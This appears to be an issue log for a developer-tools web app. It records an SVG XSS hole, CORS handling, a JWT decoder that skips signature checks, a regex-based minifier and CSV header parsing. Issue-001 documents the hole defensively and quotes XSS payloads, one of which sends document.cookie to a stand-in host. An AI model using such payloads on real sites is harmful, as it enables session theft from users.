# DevTools Utility Issues — (2026-03-31)

## Issue-001: SVG Optimizer XSS vulnerability (dangerouslySetInnerHTML)
- **Found at:** `src/app/svg/page.tsx:234-237`
- **Symptom:** User-supplied SVG rendered via `dangerouslySetInnerHTML={{ __html: output }}` without sanitization
- **Cause:** `optimize()` function (lines 40-85) only does structural cleanup (remove comments/metadata/whitespace) but does NOT strip event handlers (`onload`, `onclick`, `onmouseover`) or `<script>` tags
- **Attack Vector:** `<svg onload="alert('XSS')">` or `<circle onmouseover="fetch('https://evil.com?c='+document.cookie)"/>` — passes through optimization intact and executes on render
- **Fix:** Add DOMPurify or similar SVG sanitization before rendering, or use sandboxed iframe
- **Status:** Open
- **Severity:** Critical

## Issue-002: API Tester CORS limitations not communicated
- **Found at:** `src/app/api-tester/page.tsx:102` (client-side `fetch`)
- **Symptom:** Requests to external APIs fail with "Failed to fetch" — no CORS warning shown
- **Cause:** Component is `'use client'` (line 1), all requests via browser `fetch` (line 102) — no server-side proxy, no `mode` config (lines 93-96), generic error handler (lines 135-149) doesn't distinguish CORS errors
- **Fix:** Add server-side proxy route (`/api/proxy`) or display clear CORS warning banner in UI
- **Status:** Open
- **Severity:** Medium

## Issue-003: JWT Decoder lacks signature verification
- **Found at:** `src/app/jwt/page.tsx:50-86`
- **Symptom:** JWT decoded without signature verification; Badge shows "VERIFY SIGNATURE" (line 251) but no verification is performed
- **Cause:** `handleDecode()` (lines 50-86) only does base64url decoding via `decodeBase64Url()` (lines 40-48) — no crypto library imported, signature displayed as-is (line 59)
- **Fix:** Add optional secret key input for HS256/RS256 verification; change misleading badge text from "VERIFY SIGNATURE" to "RAW SIGNATURE"
- **Status:** Open
- **Severity:** Medium

## Issue-004: JS Minifier uses regex — breaks valid JS
- **Found at:** `src/app/minify/page.tsx:57-76` (`minifyJs` function)
- **Symptom:** Minified JS can produce syntax errors (e.g. `return a / b` → `returna/b`)
- **Cause:**
  - Line 62: Lookbehind regex `(?<!:)\/\/.*$` — not supported in IE11/old Edge (ES2018+)
  - Line 74: `.replace(/\s*([=+\-*/<>!&|,;{}()[\]])\s*/g, '$1')` — strips spaces around operators including between keywords and values
  - Lines 68-70: Redundant collapse-then-remove newlines logic
- **Fix:** Replace with terser library for proper AST-based minification
- **Status:** Open
- **Severity:** Low

## Issue-005: CSV header parsing inconsistent with body parsing
- **Found at:** `src/app/csv/page.tsx:37` (header) vs `lines 99-124` (body)
- **Symptom:** CSV headers with quoted values containing delimiters are split incorrectly
- **Cause:** Headers use basic `.split(delimiter)` (line 37) but body uses proper `parseCSVLine()` (lines 99-124) which handles quotes correctly — inconsistency
- **Fix:** Change line 37 to use `const headers = parseCSVLine(lines[0], delimiter)` for consistency
- **Status:** Open
- **Severity:** Low
- **Note:** Body parsing is actually well-implemented with stateful quote handling — only headers are broken
